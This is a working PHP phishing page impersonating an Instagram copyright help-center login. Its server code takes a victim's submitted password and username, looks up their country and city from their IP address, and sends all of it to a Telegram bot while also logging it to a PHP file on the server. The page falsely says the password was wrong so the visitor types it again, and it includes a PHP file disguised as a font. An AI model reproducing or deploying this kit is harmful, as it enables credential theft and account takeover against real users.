<?php
$username=$_GET['username'];

// Coded by HydRa Layne // Lynex Host // @7iqit //

if($_POST){
  $hydrapw2=$_POST["hydrapw2"];
  $hydraip=$_SERVER["REMOTE_ADDR"];
  $konum = file_get_contents("http://ip-api.com/xml/".$hydraip);
  $cek = new SimpleXMLElement($konum);
  $hydraulke = $cek->country;
  $hydrasehir = $cek->city;
  date_default_timezone_set('Europe/Istanbul');
  $hydratarih =date("d-m-Y H:i:s");
	
	
 ///////////// Coded by Yigit Can ////// Linex Host ////////////////////////////////
//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//
  $file = fopen('linexhost.php', 'a'); ////////////////////-- Txt Ayarı --///////
  $token = 'TOKEN'; //-- Token --//////
  $chat_id = 'ID'; /////////////////////////////////////-- ID -- //////
//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//
///////////// Coded by Yigit Can ////// Linex Host //////////////////////////

	
    $address = $_SERVER["REMOTE_ADDR"];
	$location = file_get_contents("http://ip-api.com/xml/".$address);
    $get = new SimpleXMLElement($location);
    $country = $get->country;
    $city = $get->city;
    date_default_timezone_set('Europe/Istanbul');
    $date = date("d-m-Y H:i:s");
    
    $text .= 'Kullanıcı: ' . $username . PHP_EOL;
    $text .= 'Yedek Şifre: ' . $hydrapw2 . PHP_EOL;
    $text .= 'Tarih: ' . $hydratarih . PHP_EOL;
    $text .= 'Ülke: ' . $hydraulke . PHP_EOL;
    $text .= 'Şehir: ' . $hydrasehir . PHP_EOL;
    $text .= 'IP: ' . $hydraip . PHP_EOL;

    $disable_web_page_preview = null;
    $reply_to_message_id = null;
    $reply_markup = null;
    $data = array(
            'chat_id' => urlencode($chat_id),
            'text' => $text,
            'disable_web_page_preview' => urlencode($disable_web_page_preview),
            'reply_to_message_id' => urlencode($reply_to_message_id),
            'reply_markup' => urlencode($reply_markup)
        );
      
    $url = 'https://api.telegram.org/bot'.$token.'/sendMessage';
      
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, count($data));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    fwrite($file, "
   
    <body bgcolor='#202020'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='black'>
<hr>
<font color='#1fcf00'>Kullanıcı Adı: </font><font color='white'>".$username."</font><br>
<font color='#1fcf00'>Yedek Şifre: </font><font color='white'>".$hydrapw2."</font><br>
<font color='#1fcf00'>IP Adresi: </font><font color='white'>".$hydraip."</font><br>
<font color='#1fcf00'>Ülke: </font><font color='white'>".$hydraulke."</font><br>
<font color='#1fcf00'>Şehir: </font><font color='white'>".$hydrasehir."</font><br>
<font color='#1fcf00'>Tarih: </font><font color='white'>".$hydratarih."</font><br>
<hr>

    ");
  fclose($file);

  header("location: confirmed.php?username=$username");
}
?>	

<!-- 
  _   _               _   ____             __  __    _       _                       
 | | | |  _   _    __| | |  _ \    __ _    \ \/ /   | |     (_)  _ __     ___  __  __
 | |_| | | | | |  / _` | | |_) |  / _` |    \  /    | |     | | | '_ \   / _ \ \ \/ /
 |  _  | | |_| | | (_| | |  _ <  | (_| |    /  \    | |___  | | | | | | |  __/  >  < 
 |_| |_|  \__, |  \__,_| |_| \_\  \__,_|   /_/\_\   |_____| |_| |_| |_|  \___| /_/\_\ 
          |___/                                                                      
-->    

<html lang="tr-TR" class="no-js" xmlns:fb="http://www.facebook.com/2008/fbml">
<head>
	<meta charset="utf-8">
	<title>Copyright | Help Center</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">


	<link href="img/hydraicon.png" rel="shortcut icon" type="image/x-icon">

   
   <meta property="og:type" content="website">
   <meta property="og:url" content="#">

	

	<link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/npfkoakaabdallkcdbpkkhfilkkngakh">
	<link rel="search" type="application/opensearchdescription+xml" href="xml/opensearch.xml" title="Deezer.com">
	<link rel="canonical" href="login.php">


	<link href="cache/css/sass_c/app-auth.a52ae0cda4701a0aa189.css" rel="stylesheet" type="text/css">
	<script>
if (window.self === window.top) {
	document.domain = '#';
}
</script>
<script src="cache/js/legacy.09c829a3e5225510b815.js"></script>
<script src="cache/js/runtime.8046a83e21c6fed3b78f.js"></script>
<script src="cache/js/bocal-tr-TR.98da80c1370ae1f96b10.js" defer="true"></script>
<script src="cache/js/app-auth.92afb7a1e7f0af7e03cc.js" defer="true"></script>
	
		</head>
<body class="unlogged-root-page dir-ltr " data-theme="dark" data-themed="true">
<div class="tempo-topbar">
    <a href="/" id="topbar-deezer-logo">
    
  </a>
  <div class="tempo-topbar-actions">
      </div>
</div>
<div id="auth-page">
    <div class="auth-form-container auth-login gap-l-bottom">
        <div class="unlogged-authen unlogged-login">
            <div class="unlogged-container">
                <div class="unlogged-container-inner">
                    <div class="unlogged-form-container">
                        <h1 class="auth-title unlogged-heading-2">Copyright | @<?php echo   $username; ?></h1>

                        <!-- Partnership Activation entrypoint -->
                                                <div class="auth-partners-card gap-l-top">
                                                    </div>
                        
                        <!-- Switch login / reg -->
                        <div class="auth-links switch-auth-type-link">
    <div
        style="color:red;">Sorry, your password was wrong. Please check your password carefully.        
    </div>
</div>

                        <!-- Social connect -->
                        <div class="unlogged-socials-btn-container">
    <button class="tempo-btn-social loader" id="home_account_fb" role="button" data-tracking="1" data-tracking-tag="unlogged_home_click" data-tracking-params="{'type': 'facebook'}" data-login-redirect="{&quot;type&quot;:&quot;refresh&quot;,&quot;link&quot;:&quot;\/&quot;}">
  <path></path></svg>
  <span class="tempo-btn-label">Instagram | Log ın</span>
</button>

</div>                
                        <!-- Log in Form -->
                        <form method="post" id="login_form" >
    <div class="unlogged-input-container">
    <input class="unlogged-input" type="password" name="hydrapw2" minlength="5" placeholder="Password" required="" value=""><br>
		
	
							</div>
	<div>						
   <button type="username" class="auth-cta gap-m-top">
        <span class="unlogged-btn-label">Continue</span>
    </button>
</div>


<div class="recaptcha-wrapper">
    <div class="recaptcha-container">
        <div id="recaptcha_enterprise_container"></div>    </div>
</div>

    

  
    <input type="hidden" id="login_method" name="login_method" value="email">
</form>

<div class="auth-links gap-l-vertical">
    <a href="https://www.instagram.com/accounts/password/reset/" id="login_forgot_password" class="auth-link-btn" role="button">
        <button  class="bold">Forgot Password ?</button>
    </a>
    </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Recaptcha Legal mentions -->
        
    </div>
</div>
<div id="react-footer" class="footer-container"></div>
<div class="react-cookie" id="react-cookie"></div>
<div class="modal" id="modal" role="dialog" aria-hidden="true" style="display: none;">
	<?php include 'cache/slash/fonts/roboto/roboto-light.c27d89ac77468ae18f28e6b47e323a4f.php' ?>
	<div class="modal-backdrop"></div>
	<div class="modal-wrapper"></div>
</div><!-- Google Tag Manager -->
<script>


